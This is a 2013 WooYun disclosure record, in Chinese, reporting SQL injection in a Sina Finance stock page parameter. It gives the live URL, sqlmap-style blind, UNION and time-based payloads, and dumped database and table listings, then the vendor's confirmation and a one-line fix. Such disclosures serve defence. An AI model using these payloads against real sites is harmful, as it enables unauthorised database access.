{"id": 7959, "wybug_id": "wooyun-2013-039774", "wybug_title": "新浪财经的一个sqli注入漏洞", "wybug_corp": "新浪", "wybug_author": "霍大然", "wybug_date": "2013-10-15 11:02", "wybug_open_date": "2013-11-29 11:03", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "11", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["信息泄露", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-11-29：\t细节向公众公开  简要描述： 新浪财经的一个sqli注入漏洞 详细说明：  注入点：http://biz.finance.sina.com.cn/stkrcmd/stkrcmd_people.php?stk_id=sh600981 (GET)Place: GETParameter: stk_id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: stk_id=sh600981' AND 5502=5502 AND 'oTFg'='oTFg    Type: UNION query    Title: MySQL UNION query (NULL) - 5 columns    Payload: stk_id=sh600981' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716e747071,0x4f434a4f5248524f7a70,0x716a667471),NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: stk_id=sh600981' AND SLEEP(5) AND 'VpRa'='VpRa---web application technology: Apacheback-end DBMS: MySQL 5.0.11    Payload: stk_id=sh600981' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716e747071,0x4f434a4f5248524f7a70,0x716a667471),NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: stk_id=sh600981' AND SLEEP(5) AND 'VpRa'='VpRa---web application technology: Apacheback-end DBMS: MySQL 5.0.11available databases [3]:[*] biz[*] information_schema[*] testback-end DBMS: MySQL 5.0.11Database: information_schema[17 tables]+---------------------------------------+| CHARACTER_SETS                        || COLLATIONS                            || COLLATION_CHARACTER_SET_APPLICABILITY || COLUMNS                               || COLUMN_PRIVILEGES                     || KEY_COLUMN_USAGE                      || PROFILING                             || ROUTINES                              || SCHEMATA                              || SCHEMA_PRIVILEGES                     || STATISTICS                            || TABLES                                || TABLE_CONSTRAINTS                     || TABLE_PRIVILEGES                      || TRIGGERS                              || USER_PRIVILEGES                       || VIEWS                                 |+---------------------------------------+web application technology: Apacheback-end DBMS: MySQL 5.0.11Database: information_schemaTable: USER_PRIVILEGES[4 columns]+----------------+--------------+| Column         | Type         |+----------------+--------------+| GRANTEE        | varchar(81)  || IS_GRANTABLE   | varchar(3)   || PRIVILEGE_TYPE | varchar(64)  || TABLE_CATALOG  | varchar(512) |+----------------+--------------+web application technology: Apacheback-end DBMS: MySQL 5.0.11Database: information_schemaTable: TABLES[21 columns]+-----------------+--------------+| Column          | Type         |+-----------------+--------------+| VERSION         | bigint(21)   || AUTO_INCREMENT  | bigint(21)   || AVG_ROW_LENGTH  | bigint(21)   || CHECK_TIME      | datetime     || CHECKSUM        | bigint(21)   || CREATE_OPTIONS  | varchar(255) || CREATE_TIME     | datetime     || DATA_FREE       | bigint(21)   || DATA_LENGTH     | bigint(21)   || ENGINE          | varchar(64)  || INDEX_LENGTH    | bigint(21)   || MAX_DATA_LENGTH | bigint(21)   || ROW_FORMAT      | varchar(10)  || TABLE_CATALOG   | varchar(512) || TABLE_COLLATION | varchar(64)  || TABLE_COMMENT   | varchar(80)  || TABLE_NAME      | varchar(64)  || TABLE_ROWS      | bigint(21)   || TABLE_SCHEMA    | varchar(64)  || TABLE_TYPE      | varchar(64)  || UPDATE_TIME     | datetime     |+-----------------+--------------+   漏洞证明：  \n\n   修复方案：  对参数过滤   版权声明：转载请注明来源 霍大然@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2013-10-15 11:24 厂商回复： 感谢关注新浪安全，马上安排相关人员修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-15 11:20 |    \t\tMeirLin \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:30        | 号借人)\t\t \n  Sqli 是什么?     \n     2013-10-15 11:23 |    \t\t霍大然 \t\t\t( 普通白帽子  |\t\t\t        Rank:1136 漏洞数:178        | W币花完了，刷分还是不刷？)\t\t \n  你眼力真好，我都没发现多打了一个i    \n     2013-10-15 14:09 |    \t\tFireweed \t\t\t( 普通白帽子  |\t\t\t        Rank:107 漏洞数:14        | Show me the #)\t\t \n  Sqli是sql的下一个版本    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}